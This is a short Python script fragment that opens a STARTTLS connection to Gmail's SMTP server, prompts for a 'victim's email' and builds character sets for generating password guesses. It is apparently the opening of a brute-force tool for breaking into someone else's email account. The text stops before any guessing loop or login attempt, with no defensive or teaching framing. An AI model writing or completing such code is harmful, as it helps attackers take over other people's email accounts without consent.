import smtplib as smtp

smtpserver = smtp.SMTP('smtp.gmail.com', 587)
smtpserver.ehlo()
smtpserver.starttls()

email = input('Victim\'s email:     ')
passwords = []

capitals = 'QWERTYUIOPASDFGHJKLZXCVBNM'
small = 'qwertyuiopasdfghjklzxcvbnm'
numbers = '1234567890'
symbols = '. _-'

